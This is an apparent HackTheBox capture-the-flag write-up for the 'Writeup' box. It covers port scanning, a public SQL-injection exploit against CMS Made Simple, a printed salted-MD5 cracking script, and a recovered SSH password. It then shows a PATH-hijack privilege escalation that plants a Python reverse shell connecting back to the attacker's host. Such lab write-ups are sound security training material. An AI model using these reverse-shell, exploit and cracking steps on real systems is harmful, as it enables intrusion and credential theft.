This is my first writeup for any of the boxes I've done on HackTheBox and, fittingly, it's for writeup.

![writeup info](Writeup.JPG)

The box has a vulnerable version of CMS Made Simple installed on it. Once on the box, it has a recurring command to run run-parts, which has a relative path specified that allows the user to create their own executable that will be run when the command triggers.
Both of these together allow the user to gain root access and retrieve the flag.

Let's get to it with some enumeration using nmap:
```
# Nmap 7.70 scan initiated Thu Jun 20 17:46:20 2019 as: nmap -vvv -sV -sC -oA nmap 10.10.10.138
Nmap scan report for 10.10.10.138
Host is up, received echo-reply ttl 63 (0.10s latency).
Scanned at 2019-06-20 17:46:20 EDT for 24s
Not shown: 998 filtered ports
Reason: 998 no-responses
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKBbBK0GkiCbxmAbaYsF4DjDQ3JqErzEazl3v8OndVhynlxNA5sMnQmyH+7ZPdDx9IxvWFWkdvPDJC0rUj1CzOTOEjN61Qd7uQbo5x4rJd3PAgqU21H9NyuXt+T1S/Ud77xKei7fXt5kk1aL0/mqj8wTk6HDp0ZWrGBPCxcOxfE7NBcY3W++IIArn6irQUom0/AAtR3BseOf/VTdDWOXk/Ut3rrda4VMBpRcmTthjsTXAvKvPJcaWJATtRE2NmFjBWixzhQU+s30jPABHcVtxl/Fegr3mvS7O3MpPzoMBZP6Gw8d/bVabaCQ1JcEDwSBc9DaLm4cIhuW37dQDgqT1V
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPzrVwOU0bohC3eXLnH0Sn4f7UAwDy7jx4pS39wtkKMF5j9yKKfjiO+5YTU//inmSjlTgXBYNvaC3xfOM/Mb9RM=
|   256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEuLLsM8u34m/7Hzh+yjYk4pu3WHsLOrPU2VeLn22UkO
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 20 17:46:44 2019 -- 1 IP address (1 host up) scanned in 24.36 seconds
```

With a standard scan there only appears to be ssh and a web server accessible for now.

Upon opening 10.10.10.138 in a browser, we are greeted with this message:

```
########################################################################
#                                                                      #
#           *** NEWS *** NEWS *** NEWS *** NEWS *** NEWS ***           #
#                                                                      #
#   Not yet live and already under attack. I found an   ,~~--~~-.      #
#   Eeyore DoS protection script that is in place and   +      | |\    #
#   watches for Apache 40x errors and bans bad IPs.     || |~ |`,/-\   #
#   Hope you do not get hit by false-positive drops!    *\_) \_) `-'   #
#                                                                      #
#   If you know where to download the proper Donkey DoS protection     #
#   please let me know via mail to jkr@writeup.htb - thanks!           #
#                                                                      #
########################################################################
```

So this site will probably ban us for a bit if we scan too fast. We might as well check some standard enumeration targets first; it is supposed to be an "easy" box after all.
Let's check robots.txt. There is one disallowed url:
```
#              __
#      _(\    |@@|
#     (__/\__ \--/ __
#        \___|----|  |   __
#            \ }{ /\ )_ / _\
#            /\__/\ \__O (__
#           (--/\--)    \__/
#           _)(  )(_
#          `---''---`

# Disallow access to the blog until content is finished.
User-agent: * 
Disallow: /writeup/
```

Upon checking the writeup directory we see a homepage that lists multiple writeups that are all accessed with index.php?page=x.
This indicates there could be some php file inclusion vuln or injection available. Using Wappalyzer to check used technologies, it lists that the website appears to be using CMS Made Simple.
Let's see if there are some exploits available for it.

```
root@kali:~/Documents/htb/boxes/writeup# searchsploit cms made simple 
--------------------------------------- ----------------------------------------
 Exploit Title                         |  Path                                  
                                       | (/usr/share/exploitdb/)                
--------------------------------------- ----------------------------------------

...
CMS Made Simple < 2.2.10 - SQL Injecti | exploits/php/webapps/46635.py
...
```
Here's one that mentions SQL Injection. This seems like a good choice for when we have an index.php loading page.

Let's copy the python file to the current directory and check it out. It tries to dump salts, usernames, emails, and passwords, then attempt to crack them. 
Run the command:
```
python 46635.py -u http://10.10.10.138/writeup/
```
which gives the following output after changing TIME to 1 inside the script.

<pre><font color="#8AE234"><b>[+] Salt for password found: 5a599ef579066807</b></font>
<font color="#8AE234"><b>[+] Username found: jkr</b></font>
<font color="#8AE234"><b>[+] Email found: jkr@writeup.htb</b></font>
<font color="#8AE234"><b>[+] Password found: 62def4866937f08cc13bab43bb14e6f7</b></font>
</pre>

Personally, I decided to yank out the password cracking portion so I could rerun it without waiting on the exploit if it happened to fail.
Here's the code:
```python
import hashlib

def crack_password():
    password = "62def4866937f08cc13bab43bb14e6f7"
    wordlist = "/usr/share/wordlists/rockyou.txt"
    salt = "5a599ef579066807"
    dict = open(wordlist)
    for line in dict.readlines():
        line = line.replace("\n", "")
        if hashlib.md5(str(salt) + line).hexdigest() == password:
            print  "\n[+] Password cracked: " + line
            break
    dict.close()

print "Cracking..."
crack_password()
```

Run it:
<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>~/Documents/htb/boxes/writeup</b></font># python crack_pass.py                  
Cracking...

[+] Password cracked: raykayjay9
</pre>
Try to log in through ssh with these credentials and we have user.txt
```
jkr@writeup:~$ wc user.txt 
 1  1 33 user.txt
```
Running a 64bit version of pspy we see one of the commands being run as root (seemingly when people log in with ssh) is the following:
```
sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new  
```
Check the directory permissions and which groups jkr belongs to:
<pre>
jkr@writeup:~$ ls -al /usr/local
total 64
drwxrwsr-x 10 root staff  4096 Apr 19 04:11 <font color="#729FCF"><b>.</b></font>
drwxr-xr-x 10 root root   4096 Apr 19 04:11 <font color="#729FCF"><b>..</b></font>
drwx-wsr-x  2 root staff 20480 Oct 11 22:18 <font color="#729FCF"><b>bin</b></font>
drwxrwsr-x  2 root staff  4096 Apr 19 04:11 <font color="#729FCF"><b>etc</b></font>
drwxrwsr-x  2 root staff  4096 Apr 19 04:11 <font color="#729FCF"><b>games</b></font>
drwxrwsr-x  2 root staff  4096 Apr 19 04:11 <font color="#729FCF"><b>include</b></font>
drwxrwsr-x  4 root staff  4096 Apr 24 13:13 <font color="#729FCF"><b>lib</b></font>
lrwxrwxrwx  1 root staff     9 Apr 19 04:11 <font color="#34E2E2"><b>man</b></font> -&gt; <font color="#729FCF"><b>share/man</b></font>
drwx-wsr-x  2 root staff 12288 Oct 11 22:21 <font color="#729FCF"><b>sbin</b></font>
drwxrwsr-x  7 root staff  4096 Apr 19 04:30 <font color="#729FCF"><b>share</b></font>
drwxrwsr-x  2 root staff  4096 Apr 19 04:11 <font color="#729FCF"><b>src</b></font>
jkr@writeup:~$ groups
jkr cdrom floppy audio dip video plugdev staff netdev
</pre>
So our user has no read permissions to /usr/local/bin, but we have write permissions. Due to this we can just drop a script from our host machine in and have that be run first because of its order in the PATH (since other users were on the box /usr/local/bin was changed less often than sbin so I decided to go through there).

We need a script to run instead of run-parts. Thankfully I already have a python reverse shell on my attacking machine and I rename that to run-parts.
To transfer it, I start up a web server. Grab it and save it to one of the first folders listed in the PATH. The code is listed at the bottom of the next block.
<pre>jkr@writeup:/usr/local/bin$ wget 10.10.15.8:8000/run-parts                     
--2019-10-11 22:17:17--  http://10.10.15.8:8000/run-parts                      
Connecting to 10.10.15.8:8000... connected.                                    
HTTP request sent, awaiting response... 200 OK                                 
Length: 234 [application/octet-stream]
Saving to: ‘run-parts’

run-parts           100%[===================&gt;]     234  --.-KB/s    in 0s      

2019-10-11 22:17:17 (20.6 MB/s) - ‘run-parts’ saved [234/234]                  

jkr@writeup:/usr/local/bin$ cat run-parts                                      
#!/usr/bin/env python3
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)                             
s.connect((&quot;10.10.15.8&quot;,1000))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn(&quot;/bin/bash&quot;)
jkr@writeup:/usr/local/bin$ chmod +x run-parts                                 
jkr@writeup:/usr/local/bin$ ls -al run-parts                                   
-rwxr-xr-x 1 jkr staff 234 Oct 11 01:05 <font color="#8AE234"><b>run-parts</b></font></pre>

Open up a listening port and connect to writeup with ssh again in another window or tab. A connection appears within seconds.
<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>~/Documents/htb/boxes/writeup</b></font># nc -lnvp 1000                         
listening on [any] 1000 ...
connect to [10.10.15.8] from (UNKNOWN) [10.10.10.138] 55596                    
root@writeup:/home# cd /root
cd /root
root@writeup:/root# ls
ls
bin  root.txt
root@writeup:/root# wc root.txt
wc root.txt
 1  1 33 root.txt
root@writeup:/root# 
</pre>
Success! We have root.